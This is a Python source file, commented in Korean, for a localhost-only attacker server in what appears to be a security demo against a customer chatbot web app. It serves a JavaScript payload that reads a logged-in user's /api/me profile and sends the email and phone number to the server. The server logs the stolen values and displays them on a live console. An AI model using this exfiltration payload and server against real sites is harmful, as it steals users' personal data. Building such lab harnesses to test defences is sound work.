"""로컬 공격자 서버 (S2 확인용). 127.0.0.1에서만 실행하고, 받은 요청을 기록한다.

- GET /x : S2 숨긴 코드가 불러가는 스크립트. 로그인한 사용자의 /api/me를 읽어 /c로 보낸다.
- GET /c?d=... : 빼돌린 값이 도착하는 곳.
- GET / (또는 /console) : 탈취 데이터 콘솔 페이지 (고객 챗봇 화면 밖에서 따로 본다).
- GET /log.json : 콘솔이 읽는 기록 JSON.
공격 트래픽(/x·/c)만 artifacts/attacker_log.jsonl에 한 줄씩 남고, 콘솔 조회는 기록하지 않는다.
공격 성공 판정은 이 기록으로 한다.

실행 (backend 폴더):
    .\\.venv\\Scripts\\python.exe -m attacker.server
그 뒤 브라우저로 http://127.0.0.1:9999/ 를 열면 탈취 데이터가 실시간으로 보인다.
"""

import json
import threading
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

from attacker.console import console_html

HOST = "127.0.0.1"
PORT = 9999
LOG_FILE = Path(__file__).resolve().parents[2] / "artifacts" / "attacker_log.jsonl"
_lock = threading.Lock()


def exfil_script(base: str) -> str:
    # 브라우저(OFF 화면)에서 실행된다. httpOnly 쿠키는 못 읽지만, 같은 사이트의 /api/me는 쿠키와 함께 불러올 수 있다.
    return (
        "fetch(location.origin+'/api/me').then(r=>r.json()).then(d=>{"
        f"new Image().src='{base}/c?d='+encodeURIComponent(JSON.stringify({{email:d.email,phone:d.phone}}));"
        "});\n"
    )


def read_log(path: Path = LOG_FILE) -> list[dict[str, object]]:
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]


class Handler(BaseHTTPRequestHandler):
    log_file: Path = LOG_FILE

    def _record(self) -> None:
        url = urlsplit(self.path)
        entry = {
            "time": datetime.now(timezone.utc).isoformat(),
            "method": self.command,
            "path": url.path,
            "query": {k: v[0] if len(v) == 1 else v for k, v in parse_qs(url.query).items()},
            "origin": self.headers.get("Origin"),
            "referer": self.headers.get("Referer"),
            "user_agent": self.headers.get("User-Agent"),
        }
        with _lock:
            self.log_file.parent.mkdir(parents=True, exist_ok=True)
            with self.log_file.open("a", encoding="utf-8") as f:
                f.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def _send(self, status: int, body: bytes, content_type: str | None) -> None:
        self.send_response(status)
        if content_type:
            self.send_header("Content-Type", content_type)
        # 다른 출처(5173)의 화면이 모듈 스크립트를 불러갈 수 있게 허용한다.
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:  # noqa: N802
        path = urlsplit(self.path).path
        # 콘솔·로그 조회는 '공격'이 아니므로 기록하지 않는다.
        if path in ("/", "/console"):
            self._send(200, console_html("/log.json").encode(), "text/html; charset=utf-8")
            return
        if path == "/log.json":
            body = json.dumps(read_log(self.log_file), ensure_ascii=False).encode()
            self._send(200, body, "application/json; charset=utf-8")
            return
        # 이하 실제 공격 트래픽(/x 스크립트 요청, /c 수집)만 기록한다.
        self._record()
        if path == "/x":
            script = exfil_script(f"http://{HOST}:{self.server.server_address[1]}").encode()
            self._send(200, script, "text/javascript; charset=utf-8")
        else:
            self._send(204, b"", None)

    def log_message(self, format: str, *args: object) -> None:  # noqa: A002
        print(f"[attacker] {self.command} {self.path}")


def make_server(port: int = PORT, log_file: Path = LOG_FILE) -> ThreadingHTTPServer:
    handler = type("BoundHandler", (Handler,), {"log_file": log_file})
    return ThreadingHTTPServer((HOST, port), handler)  # 항상 127.0.0.1에만 연다


def main() -> None:
    server = make_server()
    print(f"공격자 서버: http://{HOST}:{PORT}/ (탈취 데이터 콘솔) · 기록: {LOG_FILE}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
